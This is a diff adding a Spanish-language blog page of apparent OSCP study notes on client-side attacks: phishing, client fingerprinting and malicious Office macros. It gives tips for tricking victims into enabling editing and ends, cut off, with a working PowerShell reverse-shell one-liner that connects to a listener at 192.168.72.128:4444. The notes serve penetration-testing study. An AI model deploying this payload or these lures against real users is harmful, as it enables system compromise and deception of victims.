@@ -1,0 +1,1618 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- Beautiful Jekyll 5.0.0 | Copyright Dean Attali 2020 -->
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  
+
+  
+
+  <title>Client Side</title>
+
+  
+  <meta name="author" content="Qv1nTv5">
+  
+
+  <meta name="description" content="Client Side attacks.">
+
+  
+
+  
+
+  
+  <link rel="alternate" type="application/rss+xml" title="Home" href="http://localhost:4000/feed.xml">
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+    
+      
+  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+
+    
+      
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800">
+
+
+    
+  
+
+  
+    
+      <link rel="stylesheet" href="/assets/css/bootstrap-social.css">
+    
+      <link rel="stylesheet" href="/assets/css/beautifuljekyll.css">
+    
+  
+
+  
+
+  
+  
+  
+
+  
+
+  
+  <meta property="og:site_name" content="Home">
+  <meta property="og:title" content="Client Side">
+  <meta property="og:description" content="Client Side attacks.">
+
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:article:author" content="Qv1nTv5">
+  <meta property="og:article:published_time" content="2023-11-17T00:00:00-05:00">
+  <meta property="og:url" content="http://localhost:4000/2023-11-17-17.Client_Side_Attacks/">
+  <link rel="canonical" href="http://localhost:4000/2023-11-17-17.Client_Side_Attacks/">
+  
+
+  
+  <meta name="twitter:card" content="summary">
+  
+  <meta name="twitter:site" content="@Qvintvs1">
+  <meta name="twitter:creator" content="@Qvintvs1">
+
+  <meta property="twitter:title" content="Client Side">
+  <meta property="twitter:description" content="Client Side attacks.">
+
+  
+
+  
+
+
+  
+
+  
+
+</head>
+
+
+<body>
+
+  
+
+
+  <nav class="navbar navbar-expand-xl navbar-light fixed-top navbar-custom top-nav-regular"><a class="navbar-brand" href="http://localhost:4000/">Home</a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+
+  <div class="collapse navbar-collapse" id="main-navbar">
+    <ul class="navbar-nav ml-auto">
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Program</a>
+            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                  <a class="dropdown-item" href="/Cpage">C</a>
+                  <a class="dropdown-item" href="/DHARMApage">Dharma</a>
+            </div>
+          </li>
+        
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Pentest</a>
+            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                  <a class="dropdown-item" href="/BURPSUITEpage">Burp</a>
+                  <a class="dropdown-item" href="/THMpage">Thm</a>
+                  <a class="dropdown-item" href="/HackTheBoxpage">Htb</a>
+                  <a class="dropdown-item" href="/PEN200page">BasicPentesting</a>
+                  <a class="dropdown-item" href="/REDTEAMBASICSpage">RedTeam</a>
+                  <a class="dropdown-item" href="/BLUETEAMBASICSpage">Blueteam</a>
+                  <a class="dropdown-item" href="/REDESpage">Net</a>
+                  <a class="dropdown-item" href="/2022-11-17-GitBasics">Git</a>
+            </div>
+          </li>
+        
+        <li class="nav-item">
+          <a class="nav-link" id="nav-search-link" href="#" title="Search">
+            <span id="nav-search-icon" class="fa fa-search"></span>
+            <span id="nav-search-text">Search</span>
+          </a>
+        </li></ul>
+  </div>
+
+  
+
+  
+
+</nav>
+
+
+
+<div id="beautifuljekyll-search-overlay">
+
+  <div id="nav-search-exit" title="Exit search">✕</div>
+  <input type="text" id="nav-search-input" placeholder="Search">
+  <ul id="search-results-container"></ul>
+  
+  <script src="https://unpkg.com/simple-jekyll-search@latest/dest/simple-jekyll-search.min.js"></script>
+  <script>
+    var searchjson = '[ \
+       \
+        { \
+          "title"    : "2. Constants and Literals in C.", \
+          "category" : "C", \
+          "url"      : "/2024-12-10-1.ConstantsinC-copy/", \
+          "date"     : "December 10, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "1. Basics of C", \
+          "category" : "C", \
+          "url"      : "/2024-12-02-1.BasicsOfC/", \
+          "date"     : "December  2, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "Gramáticas en Dharma", \
+          "category" : "DHA", \
+          "url"      : "/2024-09-24-Dharma_Tutorial/", \
+          "date"     : "September 24, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "Gramáticas en Dharma", \
+          "category" : "fuzz", \
+          "url"      : "/2024-03-22-Dharma_Tutorial-copy/", \
+          "date"     : "March 22, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "Mi experiencia con el OSCP", \
+          "category" : "pen", \
+          "url"      : "/2023-11-19-PEN200_Experience/", \
+          "date"     : "November 19, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Client Side", \
+          "category" : "pen", \
+          "url"      : "/2023-11-17-17.Client_Side_Attacks/", \
+          "date"     : "November 17, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Deep Packet Tunneling", \
+          "category" : "pen", \
+          "url"      : "/2023-11-16-16.Tunneling_Through_Deep_Packet_Inspection/", \
+          "date"     : "November 16, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Report", \
+          "category" : "pen", \
+          "url"      : "/2023-11-15-15.Making_Reports/", \
+          "date"     : "November 15, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Metasploit", \
+          "category" : "pen", \
+          "url"      : "/2023-11-14-14.Metasploit/", \
+          "date"     : "November 14, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Password Attacks", \
+          "category" : "pen", \
+          "url"      : "/2023-11-13-13.Password_Attacks/", \
+          "date"     : "November 13, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Active Directory Attacks", \
+          "category" : "pen", \
+          "url"      : "/2023-11-12-12.Active_Directory_Attacks/", \
+          "date"     : "November 12, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Port Forwarding", \
+          "category" : "pen", \
+          "url"      : "/2023-11-11-11.Port_Forwarding/", \
+          "date"     : "November 11, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Privilege Escalation", \
+          "category" : "pen", \
+          "url"      : "/2023-11-10-10.Privilege_Escalation/", \
+          "date"     : "November 10, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "File Transfers", \
+          "category" : "pen", \
+          "url"      : "/2023-11-09-9.File_Tranfers/", \
+          "date"     : "November  9, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Buffer Overflows", \
+          "category" : "pen", \
+          "url"      : "/2023-11-08-8.Buffer_Overflows/", \
+          "date"     : "November  8, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Vulnerability Scanning.", \
+          "category" : "pen", \
+          "url"      : "/2023-11-07-7.Vulnerability_Scanning/", \
+          "date"     : "November  7, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Information Gathering", \
+          "category" : "pen", \
+          "url"      : "/2023-11-06-6.Active_Information_Gathering/", \
+          "date"     : "November  6, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Windows", \
+          "category" : "pen", \
+          "url"      : "/2023-11-05-5.Windows/", \
+          "date"     : "November  5, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Networking", \
+          "category" : "pen", \
+          "url"      : "/2023-11-04-4.Networking/", \
+          "date"     : "November  4, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Scripting", \
+          "category" : "pen", \
+          "url"      : "/2023-11-03-3.Scripting/", \
+          "date"     : "November  3, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Practical Tools", \
+          "category" : "pen", \
+          "url"      : "/2023-11-02-2.PracticalTools/", \
+          "date"     : "November  2, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Linux", \
+          "category" : "pen", \
+          "url"      : "/2023-11-01-1.Linux/", \
+          "date"     : "November  1, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Easy", \
+          "category" : "hack", \
+          "url"      : "/2022-12-01-Easy/", \
+          "date"     : "December  1, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Git Basics", \
+          "category" : "", \
+          "url"      : "/2022-11-17-GitBasics/", \
+          "date"     : "November 17, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Tier I", \
+          "category" : "hack", \
+          "url"      : "/2022-11-10-Tier_1/", \
+          "date"     : "November 10, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Tier 0", \
+          "category" : "hack", \
+          "url"      : "/2022-11-09-Tier_0/", \
+          "date"     : "November  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "7.BufferOverflow.", \
+          "category" : "thm", \
+          "url"      : "/2022-11-02-7.BufferOverflow/", \
+          "date"     : "November  2, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "6.Offensive Pentesting", \
+          "category" : "thm", \
+          "url"      : "/2022-11-01-6.OffensivePentesting/", \
+          "date"     : "November  1, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "5.RedTeam", \
+          "category" : "thm", \
+          "url"      : "/2022-10-30-5.RedTeam/", \
+          "date"     : "October 30, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "4.Windows", \
+          "category" : "thm", \
+          "url"      : "/2022-10-22-4.Windows/", \
+          "date"     : "October 22, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "3.Junior Penetrationtester path", \
+          "category" : "thm", \
+          "url"      : "/2022-09-02-3.JRPenetrationTester/", \
+          "date"     : "September  2, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "2.Complete Begginer path.", \
+          "category" : "thm", \
+          "url"      : "/2022-08-07-2.CompleteBegginer/", \
+          "date"     : "August  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "1.Pre-Security path.", \
+          "category" : "thm", \
+          "url"      : "/2022-07-11-1Pre-Security/", \
+          "date"     : "July 11, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "0.Scripting for pentesters.", \
+          "category" : "thm", \
+          "url"      : "/2022-07-10-0.Scripting_for_pentesters/", \
+          "date"     : "July 10, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Burp Certified Practitioner Practice Exam.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-30-PracticeExam/", \
+          "date"     : "March 30, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "22. OAuth Authentication.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-27-22.OAuth_authentication/", \
+          "date"     : "March 27, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "21. HTTP Request Smuggling.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-26-21.HTTP_request_smuggling/", \
+          "date"     : "March 26, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "20. HTTP Host Header Attacks.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-25-20.HTTP_Host_header_attacks/", \
+          "date"     : "March 25, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "19. Web Cache Poisoning.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-24-19.Web_cache_poisoning/", \
+          "date"     : "March 24, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "18. Server-Side Template Injection.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-23-18.Serve-side_template_injection/", \
+          "date"     : "March 23, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "17. Insecure Deserialization.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-22-17.Insecure_deserialization/", \
+          "date"     : "March 22, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "16. WebSockets.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-21-16.WebSockets/", \
+          "date"     : "March 21, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "15.DOM-based XSS vulnerabilities.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-20-15-DOM-based_vulnerabilities/", \
+          "date"     : "March 20, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "14. Clickjacking.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-19-14.Clickjacking/", \
+          "date"     : "March 19, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "13. Cross-Origin Resource Sharing.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-18-13.Cross-origin_resource_sharing_(CORS)/", \
+          "date"     : "March 18, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "12. Cross-Site Request Forgery.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-17-12.Cross-site_request_forgery_(CSRF)/", \
+          "date"     : "March 17, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "11. Cross-Site Scripting.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-16-11.Cross-site_scripting_(XSS)/", \
+          "date"     : "March 16, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "10. XXE Injection.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-15-10.XXE_injection/", \
+          "date"     : "March 15, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "9. Server-Side Request Forgery.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-14-9.Server-side_request_forgery/", \
+          "date"     : "March 14, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "8. File Upload.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-13-8.File_upload_vulnerabilities/", \
+          "date"     : "March 13, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "7. Access Control.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-12-7.Access_control/", \
+          "date"     : "March 12, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "6. Information Disclosure.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-11-6.Information_disclosure/", \
+          "date"     : "March 11, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "5. Bussiness Logic Vulnerabilities.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-10-5.Business_logic_vulnerabilities/", \
+          "date"     : "March 10, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "4. Command Injection.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-09-4.Command_Injection/", \
+          "date"     : "March  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "3. Directory Traversal.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-08-3.Directory_Traversal/", \
+          "date"     : "March  8, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "2. Authentication.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-07-2.Authentication/", \
+          "date"     : "March  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "1. SQLInjection", \
+          "category" : "burp", \
+          "url"      : "/2022-03-06-1.SQLInjection/", \
+          "date"     : "March  6, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Seguridad Perimetral", \
+          "category" : "blueteam", \
+          "url"      : "/2022-02-09-Seguridad_Perimetral/", \
+          "date"     : "February  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Hardening de sistemas", \
+          "category" : "blueteam", \
+          "url"      : "/2022-02-09-Hardening_de_sistemas/", \
+          "date"     : "February  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Bandit", \
+          "category" : "otw", \
+          "url"      : "/2022-02-08-Bandit/", \
+          "date"     : "February  8, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Proxy", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-Proxys/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Protocolos Relevantes", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-Protocolos_Importantes/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Curso Básico Redes", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-Precurso_Redes/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "IPs", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-IPs/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Movimientos Laterales", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-06-Introducci%C3%B3n_a_movimientos_laterales/", \
+          "date"     : "February  6, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Evasión de Defensas", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-05-Evasi%C3%B3n_de_Defensas/", \
+          "date"     : "February  5, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Escalada de privilegios", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-05-Escalada_de_privilegios/", \
+          "date"     : "February  5, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Metasploit", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-04-Metasploit_B%C3%A1sico/", \
+          "date"     : "February  4, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Ataques a aplicaciones Android", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-03-Ataques_aplicaciones_android/", \
+          "date"     : "February  3, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Ataque a aplicaciones web.", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-02-Ataques_a_aplicaciones_web/", \
+          "date"     : "February  2, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Ataques a Infraestructuras y Redes", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-01-Ataques_a_Infraestructuras_y_Redes/", \
+          "date"     : "February  1, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Análisis de Objetivos", \
+          "category" : "redteam", \
+          "url"      : "/2022-01-28-An%C3%A1lisis_de_Objetivos/", \
+          "date"     : "January 28, 2022" \
+        }, \
+       \
+       \
+        { \
+          "title"    : "Blueteam Basics", \
+          "category" : "page", \
+          "url"      : "/BLUETEAMBASICSpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "PortSwigger BurpSuite Course", \
+          "category" : "page", \
+          "url"      : "/BURPSUITEpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "C programming subjects.", \
+          "category" : "page", \
+          "url"      : "/Cpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Dharma Fuzzer language", \
+          "category" : "page", \
+          "url"      : "/DHARMApage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Exploiting &amp; Reversing", \
+          "category" : "page", \
+          "url"      : "/EXPREVpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Fuzzing JavaScript Engine", \
+          "category" : "page", \
+          "url"      : "/Fuzzpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "HackTheBox", \
+          "category" : "page", \
+          "url"      : "/HackTheBoxpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "PEN200 notes", \
+          "category" : "page", \
+          "url"      : "/PEN200page/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Proyectos", \
+          "category" : "page", \
+          "url"      : "/PROJECTSpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Networking Basics", \
+          "category" : "page", \
+          "url"      : "/REDESpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "RedTeam Basics", \
+          "category" : "page", \
+          "url"      : "/REDTEAMBASICSpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Retired Machines", \
+          "category" : "page", \
+          "url"      : "/RetiredMachinespage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "TryHackMe", \
+          "category" : "page", \
+          "url"      : "/THMpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "About me", \
+          "category" : "page", \
+          "url"      : "/aboutme/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "THM", \
+          "category" : "page", \
+          "url"      : "/preOSCPpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Tag Index", \
+          "category" : "page", \
+          "url"      : "/tags/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page2/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page3/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page4/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page5/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page6/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page7/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page8/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page9/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page10/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page11/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page12/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page13/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page14/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page15/", \
+          "date"     : "January 1, 1970" \
+        } \
+       \
+    ]';
+    searchjson = JSON.parse(searchjson);
+
+    var sjs = SimpleJekyllSearch({
+      searchInput: document.getElementById('nav-search-input'),
+      resultsContainer: document.getElementById('search-results-container'),
+      json: searchjson
+    });
+  </script>
+</div>
+
+
+
+
+
+  <!-- TODO this file has become a mess, refactor it -->
+
+
+
+
+
+
+
+<header class="header-section ">
+
+<div class="intro-header no-img">
+  <div class="container-md">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+        <div class="post-heading">
+          <h1>Client Side</h1>
+          
+            
+              <h2 class="post-subheading">Client Side attacks.</h2>
+            
+          
+
+          
+            <span class="post-meta">Posted on November 17, 2023</span>
+            
+            
+          
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</header>
+
+
+
+
+
+<div class=" container-md ">
+  <div class="row">
+    <div class=" col-xl-8 offset-xl-2 col-lg-10 offset-lg-1 ">
+
+      
+
+      
+
+      <article role="main" class="blog-post">
+        <p>En los tiempos modernos se ha vuelto cada vez más raro encontrar y explotar vulnerabilidades en servicios de networks empresariales. El <em>Phising</em> es ahora el segundo vector de ataque más utilizado despúes del robo de credenciales.</p>
+
+<p>El Phising es un tipo de ataque que se realiza enviando a los usuarios ficheros ejecutables maliciosos aprovechando software del lado del cliente (navegadores, office, etc), de forma que una vez recibidos, la acción del usuario ejecuta el payload concediéndonos un <em>foothoold</em> en el sistema.</p>
+
+<p>La característica del phising es que para funcionar es necesaria la acción de un usuario.</p>
+
+<p><br /></p>
+
+<h3 id="1-target-reconnaissance">1. Target Reconnaissance.</h3>
+
+<h4 id="11-information-gathering">1.1. Information Gathering.</h4>
+
+<p>Para buscar información sobre el software del cliente podemos aprovecharnos de técnicas de enumeración pasivas como los Google Dork o Metadatos con Exiftool.</p>
+
+<p><br /></p>
+
+<h4 id="12-client-fingerprinting">1.2. Client Fingerprinting.</h4>
+
+<p>El <em>Client Fingerprinting</em> es un conjunto de técnicas que consisten en utilizar técnicas de enumeración pasiva para obtener información del sistema operativo y el navegador una red interna no ruteable (no accesible desde una WAN)</p>
+
+<p>En muchas ocasiones estaremos interesados en obtener información sobre un dispositivo no enumerable externamente antes de lanzar un ataque. Para ello podemos utilizar el sitio Web <a href="https://canarytokens.org/generate">Canarytokens</a> un servicio web gratuito que genera un enlace con un token incrustado que enviaremos al objetivo. Cuando el objetivo abre el enlace en un navegador, obtendremos información sobre su navegador, dirección IP y sistema operativo. </p>
+
+<p><br /></p>
+
+<h3 id="2-exploiting-microsoft-office">2. Exploiting Microsoft Office.</h3>
+
+<h4 id="21-preparing-the-attack">2.1. Preparing the Attack.</h4>
+
+<p>Antes de lanzarnos al ataque, vamos a preparar tres cuestiones importantes sobre Microsoft Office:</p>
+
+<ul>
+  <li>
+    <p>Primero, debemos considerar el método de entrega de nuestro documento. Dado que los ataques de macros maliciosos son bien conocidos, los proveedores de correo electrónico y las soluciones de filtrado de spam a menudo filtran todos los documentos de Microsoft Office de forma predeterminada. Por lo tanto, en la mayoría de las situaciones no podemos simplemente enviar el documento malicioso como archivo adjunto. Además, la mayoría de los programas de capacitación antiphishing enfatizan el peligro de habilitar macros en un documento de Office enviado por correo electrónico. Para entregar nuestra carga útil y aumentar las posibilidades de que el objetivo abra el documento, podríamos usar un pretexto y proporcionar el documento de otra manera, como un enlace de descarga.</p>
+  </li>
+  <li>
+    <p>Si logramos entregar con éxito el documento de Office a nuestro objetivo por correo electrónico o enlace de descarga, el archivo se etiquetará con la <em>Mark of the Web</em> (MOTW). Los documentos de Office etiquetados con MOTW se abrirán en <em>Vista protegida</em>, que deshabilita todas las configuraciones de edición y modificación en el documento y bloquea la ejecución de macros u objetos incrustados. Cuando la víctima abre el documento con la etiqueta MOTW, Office mostrará una advertencia con la opción Habilitar <em>edición</em>. Cuando la víctima habilita la edición, la vista protegida se desactiva. Por lo tanto, la forma más básica de superar esta limitación es convencer al objetivo de que haga clic en el botón <em>Habilitar edición</em> , por ejemplo, desenfocando el resto del documento e indicándole que haga clic en el botón para “desbloquearlo”.</p>
+  </li>
+  <li>
+    <p>Finalmente, debemos considerar el anuncio de Microsoft que habla sobre el bloqueo de macros por defecto.</p>
+  </li>
+</ul>
+
+<p>Antes de pasar a la siguiente sección, alejemos el zoom aquí por un momento. Incluso después de agregar todas estas mitigaciones y crear conciencia general, las macros maliciosas de Microsoft Office siguen siendo uno de los ataques del lado del cliente más utilizados. Este ejemplo revela una dinámica subyacente entre defensores y atacantes. Por cada tecnología o componente de seguridad implementado, los atacantes se ven obligados a idear nuevos vectores de ataque y desvíos. Esto conduce a una espiral, en la que ambas partes deben idear constantemente enfoques más sofisticados a lo largo del tiempo para tener éxito. Nosotros, como probadores de penetración, por lo tanto, nunca debemos desanimarnos por los nuevos mecanismos defensivos, sino tratarlos como oportunidades para crear ataques más sofisticados.</p>
+
+<p><br /></p>
+
+<h4 id="22-leveraging-microsoft-word-macros">2.2. Leveraging Microsoft Word Macros.</h4>
+
+<p>Tanto Microsoft Word como Excel permiten los <em>Macros</em> embebidos, los cuales son básicamente scripts incluidos en documentos ejecutados por el engine de Word dedicados a tareas de manejo de contenido dinámico y links externos.</p>
+
+<p>Podemos aprovecharnos de los macros para ejecutar un reverse shell una vez el documento se abre. Este sigue siendo un vector de ataque bastante utilizado teniendo en cuenta las consideraciones descritas más arriba.</p>
+
+<p>Un ejemplo de un documento Macro que ejecuta una reverse shell en powershell podría ser el siguiente:</p>
+
+<ol>
+  <li>En primer lugar, generamos la reverse shell y la ciframos con base64:</li>
+</ol>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$TEXTO</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'$client = New-Object System.Net.Sockets.TCPClient("192.168.72.128",4444);$stream =$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'</span><span class="w">
